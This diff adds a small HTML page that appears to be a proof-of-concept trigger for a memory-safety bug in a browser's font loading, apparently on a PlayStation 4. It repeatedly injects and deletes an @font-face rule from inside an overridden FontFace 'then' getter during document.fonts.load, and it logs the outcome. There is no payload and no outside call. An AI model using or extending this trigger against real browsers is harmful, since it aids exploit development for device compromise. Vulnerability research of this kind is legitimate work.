@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — In-session loop</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#status { font-size: 18px; margin-bottom: 8px; }
+#log { height: 75vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+#t { font-family: x; font-size: 64px; color: #fff; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">loop probe...</div>
+<p style="color:#aaa;font-size:12px">Re-injects @font-face each iteration. ?n=5 for loop count. May OOM — that is data.</p>
+<div id="log"></div>
+<div id="t">AB</div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    window.ps4log = function (msg) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+})();
+
+var LOOPS = 5;
+var q = location.search.match(/[?&]n=(\d+)/);
+if (q) LOOPS = parseInt(q[1], 10);
+
+function injectRule() {
+    var s = document.getElementById('s');
+    while (s.sheet.cssRules.length) s.sheet.deleteRule(0);
+    s.sheet.insertRule(
+        "@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }",
+        0
+    );
+}
+
+function oneIteration(i) {
+    ps4log('=== iteration ' + i + ' ===');
+    injectRule();
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                document.getElementById('s').sheet.deleteRule(0);
+                document.getElementById('t').textContent = 'B';
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    document.getElementById('t').textContent = 'AB';
+    document.body.offsetTop;
+
+    ps4log('  check(B)=' + document.fonts.check('1em x', 'B'));
+    ps4log('  fonts.size=' + document.fonts.size);
+}
+
+window.onload = function () {
+    ps4log('Phase 3f — in-session loop x' + LOOPS);
+    ps4log('UA: ' + navigator.userAgent);
+
+    for (var i = 1; i <= LOOPS; i++) {
+        oneIteration(i);
+    }
+
+    ps4status('finished ' + LOOPS + ' loops', '#0f0');
+    ps4log('if still alive: try ?n=10 or ?n=20');
+};
+</script>
+</body>
+</html>
